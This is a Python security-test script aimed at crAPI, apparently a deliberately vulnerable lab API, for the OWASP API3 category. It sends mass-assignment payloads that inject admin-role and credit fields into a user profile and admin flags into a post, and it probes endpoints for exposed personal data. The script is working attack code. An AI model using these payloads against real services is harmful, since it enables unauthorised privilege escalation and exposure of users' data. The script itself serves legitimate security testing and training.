#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API3: Broken Object Property Level Authorization
Target: crAPI running on Docker (default port 8888)

Tests for:
  - Mass Assignment: sending extra properties that get accepted/stored
  - Excessive Data Exposure: API returning more fields than the UI renders
  - Privilege escalation via property injection (e.g., role, isAdmin fields)
"""

import requests
import json
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
USER_EMAIL = USER1_EMAIL
USER_PASSWORD = USER1_PASSWORD




def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_mass_assignment_user_profile(token):
    """
    API3 Test: Can we inject admin/role fields into a profile update?
    crAPI's profile update endpoint may accept undocumented fields.
    """
    print(f"\n[API3:MassAssignment] Profile Update with Injected Fields")
    headers = {"Authorization": f"Bearer {token}"}

    # First get current profile
    r = requests.get(f"{BASE_URL}/identity/api/v2/user/dashboard", headers=headers)
    print(f"  GET /dashboard → HTTP {r.status_code}")
    if r.status_code == 200:
        profile = r.json()
        print(f"  Current profile fields: {list(profile.keys())}")
        # Check for sensitive fields already in response (excessive exposure)
        sensitive_fields = ["role", "isAdmin", "admin", "credit_score",
                            "available_credit", "credit", "balance"]
        exposed = [f for f in sensitive_fields if f in profile]
        if exposed:
            print(f"  [VULNERABLE - Excessive Exposure] Sensitive fields in response: {exposed}")
            print(f"  Exposed values: { {k: profile[k] for k in exposed} }")

    # Attempt mass assignment: inject role/credit escalation fields
    evil_payload = {
        "name": "Legitimate Update",
        "number": "9876543210",
        "role": "admin",
        "isAdmin": True,
        "available_credit": 9999999,
        "credit_score": 900
    }

    r2 = requests.put(f"{BASE_URL}/identity/api/v2/user/dashboard", headers=headers,
                      json=evil_payload)
    print(f"\n  PUT /dashboard with injected fields → HTTP {r2.status_code}")
    print(f"  Payload sent: {json.dumps(evil_payload, indent=2)}")

    # Check if the injected values stuck
    r3 = requests.get(f"{BASE_URL}/identity/api/v2/user/dashboard", headers=headers)
    if r3.status_code == 200:
        updated = r3.json()
        print(f"\n  Profile after update:")
        print(json.dumps(updated, indent=2))
        injected = {k: updated.get(k) for k in ["role", "isAdmin", "available_credit", "credit_score"]
                    if k in updated}
        if injected:
            print(f"\n  [VULNERABLE] Injected fields persisted in profile: {injected}")
            return True
        else:
            print(f"\n  [PROTECTED] Injected fields were ignored/stripped")
    return False


def test_mass_assignment_community_post(token):
    """
    API3 Test: Inject extra fields into community post creation.
    Check if pinned/featured/admin properties are accepted.
    """
    print(f"\n[API3:MassAssignment] Community Post with Injected Fields")
    headers = {"Authorization": f"Bearer {token}"}

    payload = {
        "title": "Normal post title",
        "body": "This is a normal post body content.",
        "pinned": True,
        "featured": True,
        "is_admin_post": True,
        "priority": 9999
    }

    r = requests.post(f"{BASE_URL}/community/api/v2/community/posts",
                      headers=headers, json=payload)
    print(f"  POST /community/posts → HTTP {r.status_code}")

    if r.status_code in (200, 201):
        resp = r.json()
        print(f"  Response: {json.dumps(resp, indent=2)}")
        injected_found = any(k in resp for k in ["pinned", "featured", "is_admin_post"])
        if injected_found:
            print(f"  [VULNERABLE] Injected post properties were accepted and returned!")
            return True
        else:
            print(f"  [INFO] Post created but injected fields not confirmed in response")
    else:
        print(f"  Response: {r.text[:300]}")
    return False


def test_excessive_data_exposure_vehicles(token):
    """
    API3 Test: Does vehicle API return more data than the UI needs?
    Look for VINs, internal IDs, owner info, etc.
    """
    print(f"\n[API3:ExcessiveExposure] Vehicle Endpoint Data Exposure")
    headers = {"Authorization": f"Bearer {token}"}

    r = requests.get(f"{BASE_URL}/identity/api/v2/vehicle/vehicles", headers=headers)
    print(f"  GET /vehicle/vehicles → HTTP {r.status_code}")

    if r.status_code == 200:
        vehicles = r.json()
        if vehicles:
            v = vehicles[0]
            print(f"  Fields returned: {list(v.keys())}")
            sensitive = ["vin", "uuid", "owner", "pincode", "fuel_type",
                         "model", "year", "status", "vehicleLocation"]
            exposed = [f for f in sensitive if f in v]
            print(f"  Potentially over-exposed fields: {exposed}")
            print(f"  Full vehicle object:")
            print(json.dumps(v, indent=2))
            if len(exposed) >= 3:
                print(f"\n  [VULNERABLE] API exposes {len(exposed)} sensitive vehicle properties")
                return True
        else:
            print(f"  [INFO] No vehicles found. Add one via the crAPI UI first.")
    return False


def test_excessive_data_exposure_users(token):
    """
    API3 Test: Community endpoint leaking other users' PII?
    """
    print(f"\n[API3:ExcessiveExposure] Community Posts - PII Leakage Check")
    headers = {"Authorization": f"Bearer {token}"}

    r = requests.get(f"{BASE_URL}/community/api/v2/community/posts/recent", headers=headers)
    print(f"  GET /community/posts/recent → HTTP {r.status_code}")

    if r.status_code == 200:
        data = r.json()
        posts = data.get("posts", [])
        print(f"  Posts returned: {len(posts)}")
        if posts:
            sample = posts[0]
            print(f"  Sample post fields: {list(sample.keys())}")
            author = sample.get("author", {})
            print(f"  Author fields: {list(author.keys()) if isinstance(author, dict) else 'N/A'}")
            pii_fields = ["email", "phone", "number", "vehicleNumber", "location"]
            found_pii = [f for f in pii_fields if f in author or f in sample]
            if found_pii:
                print(f"  [VULNERABLE] PII fields exposed in community feed: {found_pii}")
                return True
            else:
                print(f"  [INFO] No obvious PII in community feed response")
    return False


def main():
    print("=" * 60)
    print("  crAPI - API3: Broken Object Property Level Authorization")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Mass Assignment - User Profile",    test_mass_assignment_user_profile(token)))
    results.append(("Mass Assignment - Community Post",  test_mass_assignment_community_post(token)))
    results.append(("Excessive Exposure - Vehicles",     test_excessive_data_exposure_vehicles(token)))
    results.append(("Excessive Exposure - Community PII",test_excessive_data_exposure_users(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
